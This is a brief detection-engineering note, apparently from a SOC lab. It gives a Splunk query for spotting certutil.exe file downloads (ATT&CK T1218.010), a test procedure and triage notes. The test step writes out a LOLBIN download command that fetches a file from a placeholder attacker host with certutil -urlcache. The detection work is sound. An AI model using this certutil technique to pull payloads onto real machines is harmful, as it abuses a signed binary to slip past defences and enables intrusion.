# Detection 01 – Suspicious certutil file retrieval (TP4)

**Goal:** Detect potential file downloads using certutil.exe (common LOLBIN tradecraft).  
**ATT&CK:** T1218.010 – Signed Binary Proxy Execution (certutil)  
**Data Source:** Sysmon EventID 1 (Process Creation)  

---

### ✅ SPL Query

index=* sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1
| search Image="\certutil.exe" CommandLine="-urlcache*"
| table _time host user Image CommandLine ProcessId

---

### 🧪 Test Procedure
1. On attacker box:
   	echo test > harmless.txt && python3 -m http.server 8000

2. On Windows Endpoint:
	certutil -urlcache -split -f http://<attacker_ip>:8000/harmless.txt C:\Temp\harmless.txt

3. Run SPL to detect activity


Analyst Notes:

| Category           | Details                                       |
| ------------------ | --------------------------------------------- |
| Legitimate Use     | Rare testing/admin tasks                      |
| FP Reduction       | Filter known admin accounts/hosts             |
| Detection Priority | Medium                                        |
| Response Actions   | Check downloaded file hash and parent process |
